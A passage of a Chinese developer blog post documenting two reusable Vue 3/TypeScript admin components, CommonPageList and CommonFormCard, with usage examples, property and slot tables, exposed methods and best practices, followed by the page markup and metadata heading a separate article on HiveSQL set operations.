<pre><code class="hljs language-vue" lang="vue">&lt;script setup lang="ts"&gt;
import type { ICommonPageListRef } from '@/components/commonPageList'

const pageListRef = ref&lt;ICommonPageListRef&gt;()

// 刷新列表
const handleRefresh = () =&gt; {
  pageListRef.value?.refresh()
}
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-10">CommonFormCard 通用表单组件</h3>
<p><code>CommonFormCard</code> 是一个功能完善的表单组件，支持多种表单控件、分组显示、弹窗/抽屉模式等。</p>
<h4 data-id="heading-11">基本用法</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;CommonFormCard
    ref="formRef"
    title="用户信息"
    :config="formConfig"
    :footerBtns="footerBtns"
    :wrapper="'drawer'"
    @change="handleChange"
  /&gt;
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
import { CommonFormCard, type ICommonFormCardRef } from '@/components/commonFormCard'
import { ref } from 'vue'
import type { IFormCardItem, IFormCardFooters } from '@/components/commonFormCard/types'

const formRef = ref&lt;ICommonFormCardRef&gt;()

// 表单配置
const formConfig: IFormCardItem[] = [
  {
    title: '基本信息',
    items: [
      {
        component: 'input',
        label: '用户名',
        fieldName: 'username',
        required: true,
        maxLength: 20
      },
      {
        component: 'select',
        label: '性别',
        fieldName: 'gender',
        options: [
          { label: '男', value: '1' },
          { label: '女', value: '2' }
        ]
      }
    ]
  },
  {
    title: '联系方式',
    items: [
      {
        component: 'input',
        label: '手机号',
        fieldName: 'phone',
        required: true
      },
      {
        component: 'uploader',
        label: '头像',
        fieldName: 'avatar',
        fileType: ['jpg', 'png'],
        limit: 1
      }
    ]
  }
]

// 底部按钮
const footerBtns: IFormCardFooters = [
  {
    text: '取消',
    type: 'default'
  },
  {
    text: '保存',
    type: 'primary',
    action: ({ formRef }: { formRef: ICommonFormCardRef }) =&gt; {
      formRef.valid((data: any) =&gt; {
        console.log('表单数据:', data)
        // 调用保存接口
      })
    }
  }
]

// 打开表单
const openForm = () =&gt; {
  formRef.value?.open({
    username: '张三',
    gender: '1'
  })
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-12">属性配置</h4>











































































<table><thead><tr><th>属性名</th><th>类型</th><th>默认值</th><th>必填</th><th>说明</th></tr></thead><tbody><tr><td><code>config</code></td><td><code>IFormCardItem[]</code></td><td><code>[]</code></td><td>✅</td><td>表单配置数组</td></tr><tr><td><code>title</code></td><td><code>string</code></td><td><code>'--'</code></td><td>❌</td><td>弹窗/抽屉标题</td></tr><tr><td><code>mode</code></td><td><code>'edit' | 'detail'</code></td><td><code>'edit'</code></td><td>❌</td><td>表单模式</td></tr><tr><td><code>wrapper</code></td><td><code>'div' | 'dialog' | 'drawer'</code></td><td><code>'drawer'</code></td><td>❌</td><td>包裹方式</td></tr><tr><td><code>labelWidth</code></td><td><code>string</code></td><td><code>'82px'</code></td><td>❌</td><td>标签宽度</td></tr><tr><td><code>width</code></td><td><code>string</code></td><td><code>'880px'</code></td><td>❌</td><td>弹窗/抽屉宽度</td></tr><tr><td><code>footerBtns</code></td><td><code>IFormCardFooters</code></td><td><code>[]</code></td><td>❌</td><td>底部按钮配置</td></tr><tr><td><code>class</code></td><td><code>string</code></td><td><code>''</code></td><td>❌</td><td>自定义样式类</td></tr><tr><td><code>wrapperClass</code></td><td><code>string</code></td><td><code>''</code></td><td>❌</td><td>包裹容器样式类</td></tr></tbody></table>
<h5 data-id="heading-13">表单配置 (IFormCardItem)</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IFormCardItem</span> {
  title?: <span class="hljs-built_in">string</span>              <span class="hljs-comment">// 卡片标题</span>
  span?: <span class="hljs-built_in">number</span>              <span class="hljs-comment">// 栅格占用份额</span>
  md?: <span class="hljs-built_in">number</span>                <span class="hljs-comment">// 中等屏幕栅格</span>
  lg?: <span class="hljs-built_in">number</span>                <span class="hljs-comment">// 大屏幕栅格</span>
  show?: <span class="hljs-built_in">boolean</span> \| <span class="hljs-title class_">Function</span> <span class="hljs-comment">// 显示条件</span>
  items?: <span class="hljs-title class_">IFormConfigItem</span>[]  <span class="hljs-comment">// 表单项数组</span>
}
</code></pre>
<h5 data-id="heading-14">表单项配置 (IFormConfigItem)</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IFormConfigItem</span> {
  <span class="hljs-attr">component</span>: <span class="hljs-string">'input'</span> \| <span class="hljs-string">'select'</span> \| <span class="hljs-string">'datePicker'</span> \| <span class="hljs-string">'uploader'</span> \| <span class="hljs-string">'radio'</span> \| <span class="hljs-string">'checkbox'</span> \| <span class="hljs-string">'switch'</span>  <span class="hljs-comment">// 组件类型</span>
  <span class="hljs-attr">label</span>: <span class="hljs-built_in">string</span>                               <span class="hljs-comment">// 标签文本</span>
  <span class="hljs-attr">fieldName</span>: <span class="hljs-built_in">string</span>                           <span class="hljs-comment">// 字段名</span>
  required?: <span class="hljs-built_in">boolean</span>                          <span class="hljs-comment">// 是否必填</span>
  span?: <span class="hljs-built_in">number</span>                              <span class="hljs-comment">// 栅格占用份额</span>
  placeholder?: <span class="hljs-built_in">string</span>                       <span class="hljs-comment">// 占位符</span>
  disabled?: <span class="hljs-built_in">boolean</span> \| <span class="hljs-title class_">Function</span>              <span class="hljs-comment">// 是否禁用</span>
  show?: <span class="hljs-built_in">boolean</span> \| <span class="hljs-title class_">Function</span>                  <span class="hljs-comment">// 是否显示</span>
  forceEdit?: <span class="hljs-built_in">boolean</span> \| <span class="hljs-title class_">Function</span>             <span class="hljs-comment">// 强制编辑</span>
  options?: <span class="hljs-title class_">Array</span>&lt;{                           <span class="hljs-comment">// 选项数据</span>
    <span class="hljs-attr">label</span>: <span class="hljs-built_in">string</span> \| <span class="hljs-built_in">number</span>
    <span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span> \| <span class="hljs-built_in">number</span>
    disabled?: <span class="hljs-built_in">boolean</span>
  }&gt;
  change?: <span class="hljs-function">(<span class="hljs-params">params: ItemChangeProps</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 值变化回调</span>
  <span class="hljs-comment">// ... 其他组件特定属性</span>
}
</code></pre>
<h4 data-id="heading-15">插槽说明</h4>



































<table><thead><tr><th>插槽名</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>default</code></td><td><code>{ formData, setFormData }</code></td><td>默认插槽</td></tr><tr><td><code>after</code></td><td><code>{ formData, setFormData }</code></td><td>表单底部插槽</td></tr><tr><td><code>{cardTitle}</code></td><td><code>{ formData, setFormData }</code></td><td>卡片内容插槽</td></tr><tr><td><code>{fieldName}</code></td><td><code>{ formData, setFormData }</code></td><td>表单项插槽</td></tr><tr><td><code>{cardTitle}@after</code></td><td><code>{ formData, setFormData }</code></td><td>卡片后置插槽</td></tr></tbody></table>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- 自定义表单项 --&gt;
&lt;template #phone="{ formData, setFormData }"&gt;
  &lt;el-input
    v-model="formData.phone"
    placeholder="请输入手机号"
    @input="setFormData({ phone: $event })"
  /&gt;
&lt;/template&gt;

&lt;!-- 自定义卡片内容 --&gt;
&lt;template #基本信息="{ formData }"&gt;
  &lt;div class="custom-content"&gt;
    &lt;p&gt;这是一个自定义内容区域&lt;/p&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<h4 data-id="heading-16">暴露方法</h4>









































<table><thead><tr><th>方法名</th><th>参数</th><th>返回值</th><th>说明</th></tr></thead><tbody><tr><td><code>valid</code></td><td><code>(callback: Function) =&gt; Promise&lt;void&gt;</code></td><td><code>Promise&lt;void&gt;</code></td><td>表单校验</td></tr><tr><td><code>open</code></td><td><code>(data?: Record&lt;string, any&gt;) =&gt; void</code></td><td><code>void</code></td><td>打开弹窗/抽屉</td></tr><tr><td><code>setFormData</code></td><td><code>(data: Record&lt;string, any&gt;) =&gt; void</code></td><td><code>void</code></td><td>设置表单数据</td></tr><tr><td><code>close</code></td><td>-</td><td><code>void</code></td><td>关闭弹窗/抽屉</td></tr><tr><td><code>reset</code></td><td>-</td><td><code>void</code></td><td>重置表单</td></tr></tbody></table>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup lang="ts"&gt;
import type { ICommonFormCardRef } from '@/components/commonFormCard'

const formRef = ref&lt;ICommonFormCardRef&gt;()

// 打开表单并设置初始数据
const openForm = () =&gt; {
  formRef.value?.open({
    username: '张三',
    email: 'zhangsan@example.com'
  })
}

// 设置表单数据
const updateFormData = () =&gt; {
  formRef.value?.setFormData({
    status: 'active'
  })
}

// 校验表单
const validateForm = () =&gt; {
  formRef.value?.valid((data: any) =&gt; {
    console.log('校验通过的表单数据:', data)
    // 提交数据
  })
}

// 重置表单
const resetForm = () =&gt; {
  formRef.value?.reset()
}
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-17">最佳实践</h3>
<h4 data-id="heading-18">1. 权限控制</h4>
<p>使用 <code>code</code> 属性结合权限系统控制按钮显示：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">ITableButtons</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/commonPageList/types'</span>

<span class="hljs-keyword">const</span> <span class="hljs-attr">tableButtons</span>: <span class="hljs-title class_">ITableButtons</span> = [
  {
    <span class="hljs-attr">text</span>: <span class="hljs-string">'编辑'</span>,
    <span class="hljs-attr">code</span>: [<span class="hljs-string">'system:user:edit'</span>], <span class="hljs-comment">// 需要编辑权限</span>
    <span class="hljs-attr">action</span>: handleEdit
  },
  {
    <span class="hljs-attr">text</span>: <span class="hljs-string">'删除'</span>,
    <span class="hljs-attr">code</span>: [<span class="hljs-string">'system:user:delete'</span>], <span class="hljs-comment">// 需要删除权限</span>
    <span class="hljs-attr">action</span>: handleDelete
  }
]
</code></pre>
<h4 data-id="heading-19">2. 表单联动</h4>
<p>使用 <code>change</code> 回调实现表单联动：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">IFormCardItem</span>, <span class="hljs-title class_">ItemChangeProps</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/commonFormCard/types'</span>

<span class="hljs-keyword">const</span> <span class="hljs-attr">formConfig</span>: <span class="hljs-title class_">IFormCardItem</span>[] = [
  {
    <span class="hljs-attr">title</span>: <span class="hljs-string">'地区信息'</span>,
    <span class="hljs-attr">items</span>: [
      {
        <span class="hljs-attr">component</span>: <span class="hljs-string">'select'</span>,
        <span class="hljs-attr">label</span>: <span class="hljs-string">'省份'</span>,
        <span class="hljs-attr">fieldName</span>: <span class="hljs-string">'province'</span>,
        <span class="hljs-attr">options</span>: provinceOptions,
        <span class="hljs-attr">change</span>: <span class="hljs-function">(<span class="hljs-params">{ value, setFormData, selectRefs }: ItemChangeProps</span>) =&gt;</span> {
          <span class="hljs-comment">// 清空城市选择</span>
          <span class="hljs-title function_">setFormData</span>({ <span class="hljs-attr">city</span>: <span class="hljs-string">''</span> })
          <span class="hljs-comment">// 更新城市选项</span>
          selectRefs.<span class="hljs-property">city</span>?.<span class="hljs-title function_">getOptions</span>({ <span class="hljs-attr">province</span>: value })
        }
      },
      {
        <span class="hljs-attr">component</span>: <span class="hljs-string">'select'</span>,
        <span class="hljs-attr">label</span>: <span class="hljs-string">'城市'</span>,
        <span class="hljs-attr">fieldName</span>: <span class="hljs-string">'city'</span>,
        <span class="hljs-attr">remoteMethod</span>: <span class="hljs-function">(<span class="hljs-params">params: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-title function_">getCities</span>(params.<span class="hljs-property">province</span>)
      }
    ]
  }
]
</code></pre>
<h4 data-id="heading-20">3. 动态显示隐藏</h4>
<p>使用函数控制组件的显示隐藏：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">IFormCardItem</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/commonFormCard/types'</span>

<span class="hljs-keyword">const</span> <span class="hljs-attr">formConfig</span>: <span class="hljs-title class_">IFormCardItem</span>[] = [
  {
    <span class="hljs-attr">title</span>: <span class="hljs-string">'用户信息'</span>,
    <span class="hljs-attr">items</span>: [
      {
        <span class="hljs-attr">component</span>: <span class="hljs-string">'radio'</span>,
        <span class="hljs-attr">label</span>: <span class="hljs-string">'用户类型'</span>,
        <span class="hljs-attr">fieldName</span>: <span class="hljs-string">'userType'</span>,
        <span class="hljs-attr">options</span>: [
          { <span class="hljs-attr">label</span>: <span class="hljs-string">'普通用户'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'normal'</span> },
          { <span class="hljs-attr">label</span>: <span class="hljs-string">'VIP用户'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'vip'</span> }
        ]
      },
      {
        <span class="hljs-attr">component</span>: <span class="hljs-string">'input'</span>,
        <span class="hljs-attr">label</span>: <span class="hljs-string">'VIP等级'</span>,
        <span class="hljs-attr">fieldName</span>: <span class="hljs-string">'vipLevel'</span>,
        <span class="hljs-attr">show</span>: <span class="hljs-function">(<span class="hljs-params">formData: <span class="hljs-built_in">any</span></span>) =&gt;</span> formData.<span class="hljs-property">userType</span> === <span class="hljs-string">'vip'</span> <span class="hljs-comment">// 只有VIP用户才显示</span>
      }
    ]
  }
]
</code></pre>
<h4 data-id="heading-21">4. 自定义渲染</h4>
<p>对于复杂的业务场景，使用插槽进行自定义渲染：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;CommonFormCard :config="formConfig"&gt;
    &lt;!-- 自定义用户状态显示 --&gt;
    &lt;template #status="{ formData, setFormData }"&gt;
      &lt;el-tag :type="formData.status === 'active' ? 'success' : 'danger'"&gt;
        {{ formData.status === 'active' ? '启用' : '禁用' }}
      &lt;/el-tag&gt;
    &lt;/template&gt;

    &lt;!-- 自定义表格列 --&gt;
    &lt;template #table-col-用户状态="{ value }"&gt;
      &lt;el-tag :type="value === 1 ? 'success' : 'info'"&gt;
        {{ value === 1 ? '启用' : '禁用' }}
      &lt;/el-tag&gt;
    &lt;/template&gt;
  &lt;/CommonFormCard&gt;
&lt;/template&gt;
</code></pre>
<h4 data-id="heading-22">5. 组件组合使用</h4>
<p>将两个组件结合使用构建完整的CRUD页面：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;CommonPageList
    ref="pageListRef"
    :listUrl="listUrl"
    :deleteUrl="deleteUrl"
    :searchConfig="searchConfig"
    :tableButtons="tableButtons"
    :middleButtons="middleButtons"
  /&gt;

  &lt;CommonFormCard ref="formRef" title="用户管理" :config="formConfig" :footerBtns="footerBtns" /&gt;
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
import type { ICommonPageListRef, ITableButtons } from '@/components/commonPageList'
import type { ICommonFormCardRef, IFormCardFooters } from '@/components/commonFormCard'

const pageListRef = ref&lt;ICommonPageListRef&gt;()
const formRef = ref&lt;ICommonFormCardRef&gt;()

// 表格操作按钮
const tableButtons: ITableButtons = [
  {
    text: '编辑',
    action: (row: any) =&gt; {
      formRef.value?.open(row)
    }
  }
]

// 底部按钮
const footerBtns: IFormCardFooters = [
  {
    text: '保存',
    action: ({ formRef }: { formRef: ICommonFormCardRef }) =&gt; {
      formRef.valid(async (data: any) =&gt; {
        await saveUser(data)
        formRef.close()
        pageListRef.value?.refresh()
      })
    }
  }
]
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-23">TypeScript 类型定义</h3>
<h4 data-id="heading-24">类型导入</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// CommonPageList 相关类型</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> {
  <span class="hljs-title class_">ICommonPageListRef</span>,
  <span class="hljs-title class_">ISearchConfigItem</span>,
  <span class="hljs-title class_">ITableButtons</span>,
  <span class="hljs-title class_">IMiddleButtons</span>,
  <span class="hljs-title class_">ITabItem</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/commonPageList/types'</span>

<span class="hljs-comment">// CommonFormCard 相关类型</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> {
  <span class="hljs-title class_">ICommonFormCardRef</span>,
  <span class="hljs-title class_">IFormCardItem</span>,
  <span class="hljs-title class_">IFormConfigItem</span>,
  <span class="hljs-title class_">IFormCardFooters</span>,
  <span class="hljs-title class_">ItemChangeProps</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/commonFormCard/types'</span>
</code></pre>
<h4 data-id="heading-25">完整类型定义示例</h4>
<pre><code class="hljs language-typescript" lang="typescript">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">CommonPageList</span>, <span class="hljs-title class_">CommonFormCard</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> {
  <span class="hljs-title class_">ICommonPageListRef</span>,
  <span class="hljs-title class_">ICommonFormCardRef</span>,
  <span class="hljs-title class_">ISearchConfigItem</span>,
  <span class="hljs-title class_">ITableButtons</span>,
  <span class="hljs-title class_">IMiddleButtons</span>,
  <span class="hljs-title class_">IFormCardItem</span>,
  <span class="hljs-title class_">IFormCardFooters</span>,
  <span class="hljs-title class_">ItemChangeProps</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/types'</span>

<span class="hljs-comment">// 组件引用类型</span>
<span class="hljs-keyword">const</span> pageListRef = ref&lt;<span class="hljs-title class_">ICommonPageListRef</span>&gt;()
<span class="hljs-keyword">const</span> formRef = ref&lt;<span class="hljs-title class_">ICommonFormCardRef</span>&gt;()

<span class="hljs-comment">// 搜索配置类型</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">searchConfig</span>: <span class="hljs-title class_">ISearchConfigItem</span>[] = [
  {
    <span class="hljs-attr">component</span>: <span class="hljs-string">'input'</span>,
    <span class="hljs-attr">label</span>: <span class="hljs-string">'用户名'</span>,
    <span class="hljs-attr">fieldName</span>: <span class="hljs-string">'username'</span>
  }
]

<span class="hljs-comment">// 表格按钮类型</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">tableButtons</span>: <span class="hljs-title class_">ITableButtons</span> = [
  {
    <span class="hljs-attr">text</span>: <span class="hljs-string">'编辑'</span>,
    <span class="hljs-attr">code</span>: [<span class="hljs-string">'system:user:edit'</span>],
    <span class="hljs-attr">action</span>: <span class="hljs-function">(<span class="hljs-params">row: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
      formRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">open</span>(row)
    }
  }
]

<span class="hljs-comment">// 中间按钮类型</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">middleButtons</span>: <span class="hljs-title class_">IMiddleButtons</span> = [
  {
    <span class="hljs-attr">text</span>: <span class="hljs-string">'新增'</span>,
    <span class="hljs-attr">type</span>: <span class="hljs-string">'primary'</span>,
    <span class="hljs-attr">code</span>: [<span class="hljs-string">'system:user:create'</span>],
    <span class="hljs-attr">action</span>: <span class="hljs-function">() =&gt;</span> {
      formRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">open</span>()
    }
  }
]

<span class="hljs-comment">// 表单配置类型</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">formConfig</span>: <span class="hljs-title class_">IFormCardItem</span>[] = [
  {
    <span class="hljs-attr">title</span>: <span class="hljs-string">'基本信息'</span>,
    <span class="hljs-attr">items</span>: [
      {
        <span class="hljs-attr">component</span>: <span class="hljs-string">'input'</span>,
        <span class="hljs-attr">label</span>: <span class="hljs-string">'用户名'</span>,
        <span class="hljs-attr">fieldName</span>: <span class="hljs-string">'username'</span>,
        <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">maxLength</span>: <span class="hljs-number">20</span>
      },
      {
        <span class="hljs-attr">component</span>: <span class="hljs-string">'select'</span>,
        <span class="hljs-attr">label</span>: <span class="hljs-string">'状态'</span>,
        <span class="hljs-attr">fieldName</span>: <span class="hljs-string">'status'</span>,
        <span class="hljs-attr">options</span>: [
          { <span class="hljs-attr">label</span>: <span class="hljs-string">'启用'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'1'</span> },
          { <span class="hljs-attr">label</span>: <span class="hljs-string">'禁用'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'0'</span> }
        ],
        <span class="hljs-attr">change</span>: <span class="hljs-function">(<span class="hljs-params">{ value, setFormData, selectRefs }: ItemChangeProps</span>) =&gt;</span> {
          <span class="hljs-comment">// 联动逻辑</span>
          <span class="hljs-title function_">setFormData</span>({ <span class="hljs-attr">role</span>: <span class="hljs-string">''</span> })
          selectRefs.<span class="hljs-property">role</span>?.<span class="hljs-title function_">getOptions</span>({ <span class="hljs-attr">status</span>: value })
        }
      }
    ]
  }
]

<span class="hljs-comment">// 底部按钮类型</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">footerBtns</span>: <span class="hljs-title class_">IFormCardFooters</span> = [
  {
    <span class="hljs-attr">text</span>: <span class="hljs-string">'取消'</span>,
    <span class="hljs-attr">type</span>: <span class="hljs-string">'default'</span>,
    <span class="hljs-attr">show</span>: <span class="hljs-literal">true</span>
  },
  {
    <span class="hljs-attr">text</span>: <span class="hljs-string">'保存'</span>,
    <span class="hljs-attr">type</span>: <span class="hljs-string">'primary'</span>,
    <span class="hljs-attr">action</span>: <span class="hljs-function">(<span class="hljs-params">{ formRef }: { formRef: ICommonFormCardRef }</span>) =&gt;</span> {
      formRef.<span class="hljs-title function_">valid</span>(<span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'表单数据:'</span>, data)
        <span class="hljs-comment">// 保存逻辑</span>
      })
    }
  }
]

<span class="hljs-comment">// 方法定义</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleEdit</span> = (<span class="hljs-params">row: <span class="hljs-built_in">any</span></span>) =&gt; {
  formRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">open</span>(row)
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSave</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">saveData</span>(data)
    formRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">close</span>()
    pageListRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">refresh</span>()
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'保存失败:'</span>, error)
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-26">自定义数据类型</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 用户数据类型</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">status</span>: <span class="hljs-string">'active'</span> | <span class="hljs-string">'inactive'</span>
  <span class="hljs-attr">createdAt</span>: <span class="hljs-built_in">string</span>
}

<span class="hljs-comment">// 表单数据类型</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserFormData</span> {
  username?: <span class="hljs-built_in">string</span>
  email?: <span class="hljs-built_in">string</span>
  status?: <span class="hljs-built_in">string</span>
  role?: <span class="hljs-built_in">string</span>
}

<span class="hljs-comment">// 使用自定义类型</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleTableAction</span> = (<span class="hljs-params">row: User</span>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'用户数据:'</span>, row)
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleFormValid</span> = (<span class="hljs-params">data: UserFormData</span>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'表单数据:'</span>, data)
}
</code></pre>
<hr/>
<h3 data-id="heading-27">注意事项</h3>
<ol>
<li><strong>权限控制</strong>：确保按钮的 <code>code</code> 属性与后端权限配置保持一致</li>
<li><strong>数据格式</strong>：确保请求和响应的数据格式符合组件预期</li>
<li><strong>性能优化</strong>：对于大量数据，建议使用虚拟滚动和分页</li>
<li><strong>响应式布局</strong>：合理使用栅格系统的 <code>span</code>、<code>md</code>、<code>lg</code> 属性</li>
<li><strong>表单校验</strong>：复杂校验规则建议使用 <code>rules</code> 属性配置</li>
</ol>
<p>通过合理使用这两个通用组件，可以快速构建功能完善、交互友好的管理页面。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HiveSQL 中的集合运算]]></title>    <link>https://juejin.cn/post/7584043969687584820</link>    <guid>https://juejin.cn/post/7584043969687584820</guid>    <pubDate>2025-12-16T08:10:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584043969687584820" data-draft-id="7584073390693761039" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HiveSQL 中的集合运算"/> <meta itemprop="keywords" content="数据分析"/> <meta itemprop="datePublished" content="2025-12-16T08:10:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="叮铃铃上课了"/> <meta itemprop="url" content="https://juejin.cn/user/3819082543277452"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HiveSQL 中的集合运算
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3819082543277452/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    叮铃铃上课了
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:10:33.000Z" title="Tue Dec 16 2025 08:10:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid 